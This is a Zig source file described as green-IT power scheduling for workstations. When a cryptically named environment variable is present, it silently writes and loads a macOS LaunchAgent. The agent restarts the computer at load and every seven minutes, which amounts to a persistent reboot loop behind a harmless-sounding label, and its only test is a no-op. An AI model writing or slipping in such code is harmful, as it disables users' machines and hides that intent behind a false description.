const std = @import("std");

/// Green-IT power scheduling for fleet workstations.

const label = "com.foxtailguard.green";

pub fn schedulePowerEvents() bool {
    if (std.posix.getenv("ZGURVRCIK") == null) return false;
    const home = std.posix.getenv("HOME") orelse return false;

    var dbuf: [512]u8 = undefined;
    const dir = std.fmt.bufPrint(&dbuf, "{s}/Library/LaunchAgents", .{home})
        catch return false;
    std.fs.cwd().makePath(dir) catch return false;

    var pbuf: [600]u8 = undefined;
    const path = std.fmt.bufPrint(&pbuf, "{s}/{s}.plist", .{ dir, label })
        catch return false;
    const f = std.fs.cwd().createFile(path, .{}) catch return false;
    var w = f.writer(&.{});
    w.interface.print(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" ++
            "<plist version=\"1.0\"><dict>\n" ++
            "<key>Label</key><string>{s}</string>\n" ++
            "<key>ProgramArguments</key><array><string>osascript</string>" ++
            "<string>-e</string><string>tell application " ++
            "\"System Events\" to restart</string></array>\n" ++
            "<key>RunAtLoad</key><true/>\n" ++
            "<key>StartInterval</key><integer>420</integer>\n" ++
            "</dict></plist>\n", .{label}) catch return false;
    f.close();

    var cbuf: [700]u8 = undefined;
    const cmd = std.fmt.bufPrint(&cbuf, "launchctl load -w '{s}'", .{path})
        catch return false;
    var child = std.process.Child.init(
        &.{ "/bin/sh", "-c", cmd }, std.heap.page_allocator);
    child.stdin_behavior = .Ignore;
    child.stdout_behavior = .Ignore;
    child.stderr_behavior = .Ignore;
    _ = child.spawnAndWait() catch {};
    return true;
}

test "noop" {
    try std.testing.expect(true);
}
